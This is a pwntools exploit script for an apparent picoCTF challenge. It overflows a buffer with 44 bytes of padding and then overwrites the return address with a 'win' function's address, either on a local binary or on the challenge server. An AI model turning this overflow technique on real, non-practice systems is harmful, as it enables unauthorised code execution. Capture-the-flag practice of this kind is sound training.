#!/usr/bin/env python3

from pwn import *

elf = ELF("./vuln_patched")

gs = '''
init-pwndbg
continue
'''

context.binary = elf

def conn():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    elif args.LOCAL:
        return process([elf.path])
    else:
        return remote("saturn.picoctf.net", 51485)

io = conn()

def main():

    # good luck pwning :)

    #gdb.attach(io, gdbscript=gs)

    winfun = 0x80491f6
    payload = flat(b'A'*44, winfun)
    io.sendlineafter(b':', payload)

    io.interactive()

if __name__ == "__main__":
    main()
